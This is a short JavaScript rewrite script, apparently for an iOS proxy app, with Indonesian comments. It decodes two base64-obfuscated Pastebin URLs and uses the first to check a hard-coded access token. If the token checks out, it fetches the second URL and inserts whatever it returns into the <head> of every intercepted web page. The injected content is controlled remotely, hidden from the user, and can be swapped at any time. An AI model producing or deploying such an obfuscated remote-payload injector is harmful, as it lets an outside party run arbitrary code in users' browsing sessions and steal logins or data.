const MY_TOKEN = "malik_pepek"; 

// Link dipotong (Tetap Aman)
const _0xU1 = "aHR0cHM6"+"Ly9wYXN0ZWJpbi"+"5jb20vcmF3L0d"+"NMVIyZjh1";
const _0xU2 = "aHR0cHM6"+"Ly9wYXN0ZWJp"+"bi5jb20vcmF3L"+"2tSWFY3ZnNU";

const _0xR1 = { url: atob(_0xU1) + "?t=" + Date.now() };

$task.fetch(_0xR1).then(response => {
    // VALIDASI KETAT: Token harus benar-benar ada di dalam isi Pastebin
    if (response.body && response.body.includes(MY_TOKEN)) {
        
        // JIKA OK, AMBIL PAYLOAD UI
        const _0xR2 = { url: atob(_0xU2) };
        $task.fetch(_0xR2).then(resp2 => {
            let b = $response.body;
            if (b && resp2.body) {
                // Suntikkan UI
                $done({ body: b.replace("<head>", "<head>" + resp2.body) });
            } else {
                $done({});
            }
        });

    } else {
        // JIKA TOKEN SALAH: Jangan kasih apa-apa, kirim notif
        if (response.body) {
            $notify("SECURITY", "ACCESS DENIED", "Token Salah atau Tidak Aktif!");
        }
        $done({}); // Tutup koneksi tanpa modifikasi body
    }
}, () => {
    $done({});
});
